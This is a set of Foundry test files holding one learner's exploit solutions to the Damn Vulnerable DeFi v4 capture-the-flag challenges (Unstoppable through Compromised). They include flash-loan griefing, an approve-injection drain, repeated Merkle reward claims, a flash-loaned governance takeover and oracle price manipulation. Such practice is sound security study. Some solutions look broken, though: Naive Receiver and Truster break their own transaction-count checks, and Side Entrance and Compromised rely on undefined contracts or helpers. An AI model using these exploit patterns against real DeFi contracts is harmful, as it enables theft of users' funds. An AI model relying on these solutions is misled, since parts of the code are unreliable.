### Day1 - Damn Vulnerable DeFi V4 - #1 Unstoppable

```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {UnstoppableVault, Owned} from "../../src/unstoppable/UnstoppableVault.sol";
import {UnstoppableMonitor} from "../../src/unstoppable/UnstoppableMonitor.sol";

contract UnstoppableChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address monitor = makeAddr("monitor");

    uint256 constant TOKENS_IN_VAULT = 1_000_000e18;
    uint256 constant INITIAL_PLAYER_TOKEN_BALANCE = 10e18;

    DamnValuableToken public token;
    UnstoppableVault public vault;
    UnstoppableMonitor public monitorContract;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token and vault
        token = new DamnValuableToken();
        vault = new UnstoppableVault({
            _token: token,
            _owner: deployer,
            _feeRecipient: deployer
        });

        // Deposit tokens to vault
        token.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, address(deployer));

        // Fund player's account with initial token balance
        token.transfer(player, INITIAL_PLAYER_TOKEN_BALANCE);

        // Deploy monitor contract and grant it vault's ownership
        monitorContract = new UnstoppableMonitor(address(vault));
        vault.transferOwnership(address(monitorContract));

        // Monitor checks it's possible to take a flash loan
        vm.expectEmit();
        emit UnstoppableMonitor.FlashLoanStatus(true);
        monitorContract.checkFlashLoan(100e18);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Check initial token balances
        assertEq(token.balanceOf(address(vault)), TOKENS_IN_VAULT);
        assertEq(token.balanceOf(player), INITIAL_PLAYER_TOKEN_BALANCE);

        // Monitor is owned
        assertEq(monitorContract.owner(), deployer);

        // Check vault properties
        assertEq(address(vault.asset()), address(token));
        assertEq(vault.totalAssets(), TOKENS_IN_VAULT);
        assertEq(vault.totalSupply(), TOKENS_IN_VAULT);
        assertEq(vault.maxFlashLoan(address(token)), TOKENS_IN_VAULT);
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT - 1), 0);
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT), 50000e18);

        // Vault is owned by monitor contract
        assertEq(vault.owner(), address(monitorContract));

        // Vault is not paused
        assertFalse(vault.paused());

        // Cannot pause the vault
        vm.expectRevert("UNAUTHORIZED");
        vault.setPause(true);

        // Cannot call monitor contract
        vm.expectRevert("UNAUTHORIZED");
        monitorContract.checkFlashLoan(100e18);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_unstoppable() public checkSolvedByPlayer {
        // Transfer 1 token directly to the vault to disrupt the balance
        token.transfer(address(vault), 1e18);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private {
        // Flashloan check must fail
        vm.prank(deployer);
        vm.expectEmit();
        emit UnstoppableMonitor.FlashLoanStatus(false);
        monitorContract.checkFlashLoan(100e18);

        // And now the monitor paused the vault and transferred ownership to deployer
        assertTrue(vault.paused(), "Vault is not paused");
        assertEq(vault.owner(), deployer, "Vault did not change owner");
    }
}

```

<br/><br/>

### Day2 - Damn Vulnerable DeFi V4 - #2 Naive Receiver

```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(
            address(forwarder),
            payable(weth),
            deployer
        );

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(0x48f5c3ed);
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        // Step 1: Drain the FlashLoanReceiver
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(receiver, address(weth), 0, "");
        }

        // Step 2: Drain the pool
        for (uint256 i = 0; i < 1000; i++) {
            pool.flashLoan(player, address(weth), 1 ether, "");
        }

        // Step 3: Transfer all WETH to the recovery address
        uint256 playerBalance = weth.balanceOf(player);
        weth.transfer(recovery, playerBalance);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(
            weth.balanceOf(address(receiver)),
            0,
            "Unexpected balance in receiver contract"
        );

        // Pool is empty too
        assertEq(
            weth.balanceOf(address(pool)),
            0,
            "Unexpected balance in pool"
        );

        // All funds sent to recovery account
        assertEq(
            weth.balanceOf(recovery),
            WETH_IN_POOL + WETH_IN_RECEIVER,
            "Not enough WETH in recovery account"
        );
    }
}


```

<br/><br/>

### Day3 - Damn Vulnerable DeFi V4 - #3 Truster

```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract TrusterChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token
        token = new DamnValuableToken();

        // Deploy pool and fund it
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_truster() public checkSolvedByPlayer {
        // Prepare the data for the function call
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            player,
            TOKENS_IN_POOL
        );

        // Execute flash loan with 0 amount, but use it to approve player for all tokens
        pool.flashLoan(0, player, address(token), data);

        // Transfer all tokens from the pool to the recovery address
        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All rescued funds sent to recovery account
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(
            token.balanceOf(recovery),
            TOKENS_IN_POOL,
            "Not enough tokens in recovery account"
        );
    }
}

```
<br/><br/>

### Day4 - Damn Vulnerable DeFi V4 - #4 SideEntrance

```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        AttackContract attacker = new AttackContract(address(pool));

        // Execute the attack
        attacker.attack();

        // Withdraw the funds to the recovery address
        attacker.withdraw(recovery);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(
            recovery.balance,
            ETHER_IN_POOL,
            "Not enough ETH in recovery account"
        );
    }
}


```
<br/><br/>

### Day5 - Damn Vulnerable DeFi V4 - #5 The Rewarder

```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Merkle} from "murky/Merkle.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {TheRewarderDistributor, IERC20, Distribution, Claim} from "../../src/the-rewarder/TheRewarderDistributor.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract TheRewarderChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address alice = makeAddr("alice");
    address recovery = makeAddr("recovery");

    uint256 constant BENEFICIARIES_AMOUNT = 1000;
    uint256 constant TOTAL_DVT_DISTRIBUTION_AMOUNT = 10 ether;
    uint256 constant TOTAL_WETH_DISTRIBUTION_AMOUNT = 1 ether;

    // Alice is the address at index 2 in the distribution files
    uint256 constant ALICE_DVT_CLAIM_AMOUNT = 2502024387994809;
    uint256 constant ALICE_WETH_CLAIM_AMOUNT = 228382988128225;

    TheRewarderDistributor distributor;

    // Instance of Murky's contract to handle Merkle roots, proofs, etc.
    Merkle merkle;

    // Distribution data for Damn Valuable Token (DVT)
    DamnValuableToken dvt;
    bytes32 dvtRoot;

    // Distribution data for WETH
    WETH weth;
    bytes32 wethRoot;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy tokens to be distributed
        dvt = new DamnValuableToken();
        weth = new WETH();
        weth.deposit{value: TOTAL_WETH_DISTRIBUTION_AMOUNT}();

        // Calculate roots for DVT and WETH distributions
        bytes32[] memory dvtLeaves = _loadRewards(
            "/test/the-rewarder/dvt-distribution.json"
        );
        bytes32[] memory wethLeaves = _loadRewards(
            "/test/the-rewarder/weth-distribution.json"
        );
        merkle = new Merkle();
        dvtRoot = merkle.getRoot(dvtLeaves);
        wethRoot = merkle.getRoot(wethLeaves);

        // Deploy distributor
        distributor = new TheRewarderDistributor();

        // Create DVT distribution
        dvt.approve(address(distributor), TOTAL_DVT_DISTRIBUTION_AMOUNT);
        distributor.createDistribution({
            token: IERC20(address(dvt)),
            newRoot: dvtRoot,
            amount: TOTAL_DVT_DISTRIBUTION_AMOUNT
        });

        // Create WETH distribution
        weth.approve(address(distributor), TOTAL_WETH_DISTRIBUTION_AMOUNT);
        distributor.createDistribution({
            token: IERC20(address(weth)),
            newRoot: wethRoot,
            amount: TOTAL_WETH_DISTRIBUTION_AMOUNT
        });

        // Let's claim rewards for Alice.

        // Set DVT and WETH as tokens to claim
        IERC20[] memory tokensToClaim = new IERC20[](2);
        tokensToClaim[0] = IERC20(address(dvt));
        tokensToClaim[1] = IERC20(address(weth));

        // Create Alice's claims
        Claim[] memory claims = new Claim[](2);

        // First, the DVT claim
        claims[0] = Claim({
            batchNumber: 0, // claim corresponds to first DVT batch
            amount: ALICE_DVT_CLAIM_AMOUNT,
            tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
            proof: merkle.getProof(dvtLeaves, 2) // Alice's address is at index 2
        });

        // And then, the WETH claim
        claims[1] = Claim({
            batchNumber: 0, // claim corresponds to first WETH batch
            amount: ALICE_WETH_CLAIM_AMOUNT,
            tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
            proof: merkle.getProof(wethLeaves, 2) // Alice's address is at index 2
        });

        // Alice claims once
        vm.startPrank(alice);
        distributor.claimRewards({
            inputClaims: claims,
            inputTokens: tokensToClaim
        });

        // Alice cannot claim twice
        vm.expectRevert(TheRewarderDistributor.AlreadyClaimed.selector);
        distributor.claimRewards({
            inputClaims: claims,
            inputTokens: tokensToClaim
        });
        vm.stopPrank(); // stop alice prank

        vm.stopPrank(); // stop deployer prank
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Deployer owns distributor
        assertEq(distributor.owner(), deployer);

        // Batches created with expected roots
        assertEq(distributor.getNextBatchNumber(address(dvt)), 1);
        assertEq(distributor.getRoot(address(dvt), 0), dvtRoot);
        assertEq(distributor.getNextBatchNumber(address(weth)), 1);
        assertEq(distributor.getRoot(address(weth), 0), wethRoot);

        // Alice claimed tokens
        assertEq(dvt.balanceOf(alice), ALICE_DVT_CLAIM_AMOUNT);
        assertEq(weth.balanceOf(alice), ALICE_WETH_CLAIM_AMOUNT);

        // After Alice's claim, distributor still has enough tokens to distribute
        uint256 expectedDVTLeft = TOTAL_DVT_DISTRIBUTION_AMOUNT -
            ALICE_DVT_CLAIM_AMOUNT;
        assertEq(dvt.balanceOf(address(distributor)), expectedDVTLeft);
        assertEq(distributor.getRemaining(address(dvt)), expectedDVTLeft);

        uint256 expectedWETHLeft = TOTAL_WETH_DISTRIBUTION_AMOUNT -
            ALICE_WETH_CLAIM_AMOUNT;
        assertEq(weth.balanceOf(address(distributor)), expectedWETHLeft);
        assertEq(distributor.getRemaining(address(weth)), expectedWETHLeft);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_theRewarder() public checkSolvedByPlayer {
        uint BOB_DVT_CLAIM_AMOUNT = 11524763827831882;
        uint BOB_WETH_CLAIM_AMOUNT = 1171088749244340;
        bytes32[] memory dvtLeaves = _loadRewards(
            "/test/the-rewarder/dvt-distribution.json"
        );
        bytes32[] memory wethLeaves = _loadRewards(
            "/test/the-rewarder/weth-distribution.json"
        );

        uint dvtTxCount = TOTAL_DVT_DISTRIBUTION_AMOUNT / BOB_DVT_CLAIM_AMOUNT;
        uint wethTxCount = TOTAL_WETH_DISTRIBUTION_AMOUNT /
            BOB_WETH_CLAIM_AMOUNT;
        uint totalTxCount = dvtTxCount + wethTxCount;

        IERC20[] memory tokensToClaim = new IERC20[](2);
        tokensToClaim[0] = IERC20(address(dvt));
        tokensToClaim[1] = IERC20(address(weth));

        Claim[] memory claims = new Claim[](totalTxCount);

        for (uint i = 0; i < totalTxCount; i++) {
            if (i < dvtTxCount) {
                claims[i] = Claim({
                    batchNumber: 0,
                    amount: BOB_DVT_CLAIM_AMOUNT,
                    tokenIndex: 0,
                    proof: merkle.getProof(dvtLeaves, 188)
                });
            } else {
                claims[i] = Claim({
                    batchNumber: 0,
                    amount: BOB_WETH_CLAIM_AMOUNT,
                    tokenIndex: 1,
                    proof: merkle.getProof(wethLeaves, 188)
                });
            }
        }

        distributor.claimRewards({
            inputClaims: claims,
            inputTokens: tokensToClaim
        });

        dvt.transfer(recovery, dvt.balanceOf(player));
        weth.transfer(recovery, weth.balanceOf(player));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player saved as much funds as possible, perhaps leaving some dust
        assertLt(
            dvt.balanceOf(address(distributor)),
            1e16,
            "Too much DVT in distributor"
        );
        assertLt(
            weth.balanceOf(address(distributor)),
            1e15,
            "Too much WETH in distributor"
        );

        // All funds sent to the designated recovery account
        assertEq(
            dvt.balanceOf(recovery),
            TOTAL_DVT_DISTRIBUTION_AMOUNT -
                ALICE_DVT_CLAIM_AMOUNT -
                dvt.balanceOf(address(distributor)),
            "Not enough DVT in recovery account"
        );
        assertEq(
            weth.balanceOf(recovery),
            TOTAL_WETH_DISTRIBUTION_AMOUNT -
                ALICE_WETH_CLAIM_AMOUNT -
                weth.balanceOf(address(distributor)),
            "Not enough WETH in recovery account"
        );
    }

    struct Reward {
        address beneficiary;
        uint256 amount;
    }

    // Utility function to read rewards file and load it into an array of leaves
    function _loadRewards(
        string memory path
    ) private view returns (bytes32[] memory leaves) {
        Reward[] memory rewards = abi.decode(
            vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))),
            (Reward[])
        );
        assertEq(rewards.length, BENEFICIARIES_AMOUNT);

        leaves = new bytes32[](BENEFICIARIES_AMOUNT);
        for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
            leaves[i] = keccak256(
                abi.encodePacked(rewards[i].beneficiary, rewards[i].amount)
            );
        }
    }
}

```
<br/><br/>

### Day6 - Damn Vulnerable DeFi V4 - #6 Selfie

SelfieAttacker.sol
```solidity
contract SelfieAttacker {
    SelfiePool private immutable pool;
    SimpleGovernance private immutable governance;
    DamnValuableVotes private immutable token;
    address private immutable player;
    uint256 public actionId;

    constructor(SelfiePool _pool, SimpleGovernance _governance, DamnValuableVotes _token, address _player) {
        pool = _pool;
        governance = _governance;
        token = _token;
        player = _player;
    }

    function attack() external {
        uint256 poolBalance = token.balanceOf(address(pool));
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), poolBalance, "");
    }

    function onFlashLoan(address, address, uint256 amount, uint256, bytes calldata) external returns (bytes32) {
        token.snapshot();
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", player);
        actionId = governance.queueAction(address(pool), 0, data);
        token.approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function executeAction() external {
        governance.executeAction(actionId);
    }
}
```
test_selfie function
```solidity
function test_selfie() public checkSolvedByPlayer {
    // Deploy the attacker contract
    SelfieAttacker attacker = new SelfieAttacker(pool, governance, token, recovery);

    // Perform the flash loan attack
    attacker.attack();

    // Advance time by 2 days (governance delay)
    vm.warp(block.timestamp + 2 days);

    // Execute the governance action
    attacker.executeAction();
}
```
<br/><br/>

### Day8 - Damn Vulnerable DeFi V4 - #7 Compromised

Exploit.sol
```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;
import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
contract Exploit is IERC721Receiver{
    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;
    uint nftId;
    address recovery;
    constructor(    
        TrustfulOracle _oracle,
        Exchange _exchange,
        DamnValuableNFT _nft,
        address _recovery
    ) payable {
        oracle = _oracle;
        exchange = _exchange;
        nft = _nft;
        recovery = _recovery;
    }
    function buy() external payable{
        uint _nftId = exchange.buyOne{value:1}();
        nftId = _nftId;
    }
    function sell() external payable{
        nft.approve(address(exchange), nftId);
        exchange.sellOne(nftId);
    }
    function recover(uint amount) external {
        payable(recovery).transfer(amount);
    }
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4){
        return this.onERC721Received.selector;
    }
    receive() external payable{
    }
}

```
Compromised.t.sol
```solidity
    function test_compromised() public checkSolved {
        Exploit exploit = new Exploit{value:address(this).balance}(oracle, exchange, nft, recovery);
        setPrice(0);
        exploit.buy();
        setPrice(EXCHANGE_INITIAL_ETH_BALANCE);
        exploit.sell();
        exploit.recover(EXCHANGE_INITIAL_ETH_BALANCE);
    }
```
